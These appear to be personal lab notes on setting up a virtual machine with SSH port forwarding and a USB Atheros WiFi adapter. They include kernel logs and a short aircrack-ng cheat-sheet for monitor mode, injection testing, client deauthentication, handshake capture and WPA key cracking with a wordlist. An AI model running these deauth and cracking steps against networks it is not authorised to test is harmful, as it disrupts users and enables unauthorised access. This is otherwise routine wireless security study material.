### Network 

Network -> NAT

service ssh status
ssh user@127.0.0.1 -p 2222

### Wireless

Ports -> USB -> WiFi Dongle

lsusb
sudo dmesg

```
[  238.804576] usb 1-2: new high-speed USB device number 5 using xhci_hcd
[  238.953703] usb 1-2: New USB device found, idVendor=0cf3, idProduct=9271, bcdDevice= 1.08
[  238.953705] usb 1-2: New USB device strings: Mfr=16, Product=32, SerialNumber=48
[  238.953706] usb 1-2: Product: UB93
[  238.953707] usb 1-2: Manufacturer: ATHEROS
[  238.953708] usb 1-2: SerialNumber: 12345
...
[  238.988581] usb 1-2: ath9k_htc: Firmware ath9k_htc/htc_9271-1.4.0.fw requested
[  238.989126] usbcore: registered new interface driver ath9k_htc
[  238.989846] usb 1-2: firmware: direct-loading firmware ath9k_htc/htc_9271-1.4.0.fw
[  239.286992] usb 1-2: ath9k_htc: Transferred FW: ath9k_htc/htc_9271-1.4.0.fw, size: 51008
[  240.411217] ath9k_htc 1-2:1.0: ath9k_htc: Target is unresponsive
[  240.411237] ath9k_htc: Failed to initialize the device
[  240.427473] usb 1-2: ath9k_htc: USB layer deinitialized
```

Reattach physical device:

```
[  404.512717] usb 1-2: USB disconnect, device number 5
[  423.360054] usb 1-2: new high-speed USB device number 6 using xhci_hcd
[  423.541860] usb 1-2: New USB device found, idVendor=0cf3, idProduct=9271, bcdDevice= 1.08
[  423.541861] usb 1-2: New USB device strings: Mfr=16, Product=32, SerialNumber=48
[  423.541863] usb 1-2: Product: UB93
[  423.541863] usb 1-2: Manufacturer: ATHEROS
[  423.541864] usb 1-2: SerialNumber: 12345
[  423.549958] usb 1-2: ath9k_htc: Firmware ath9k_htc/htc_9271-1.4.0.fw requested
[  423.550218] usb 1-2: firmware: direct-loading firmware ath9k_htc/htc_9271-1.4.0.fw
[  423.846398] usb 1-2: ath9k_htc: Transferred FW: ath9k_htc/htc_9271-1.4.0.fw, size: 51008
[  424.099526] ath9k_htc 1-2:1.0: ath9k_htc: HTC initialized with 33 credits
[  424.378491] ath9k_htc 1-2:1.0: ath9k_htc: FW Version: 1.4
[  424.378492] ath9k_htc 1-2:1.0: FW RMW support: On
[  424.378493] ath: EEPROM regdomain: 0x60
[  424.378494] ath: EEPROM indicates we should expect a direct regpair map
[  424.378495] ath: Country alpha2 being used: 00
[  424.378495] ath: Regpair used: 0x60
[  424.383775] ieee80211 phy1: Atheros AR9271 Rev:1
```

#### Monitor Mode

iwconfig
airmon-ng start wlan0
iwconfig

```
...
wlan0mon  IEEE 802.11  Mode:Monitor  Frequency:2.462 GHz  Tx-Power=20 dBm
          Retry short limit:7   RTS thr:off   Fragment thr:off
          Power Management:off
```
aireplay-ng -9 wlan0mon

```
13:37:12  Trying broadcast probe requests...
13:37:12  Injection is working!
13:37:14  Found 4 APs

13:37:14  Trying directed probe requests...
...
```

Find Access Points:
airodump-ng wlan0mon

Find Clients:
airodump-ng -c CHANNEL --bssid BSSID -w psk wlan0mon

Deauth:
aireplay-ng -0 COUNT -a BSSID -c MAC wlan0mon

Find key:
aircrack-ng -w /usr/share/wordlists/rockyou.txt psk-*.cap

### Links

https://www.aircrack-ng.org/doku.php?id=deauthentication
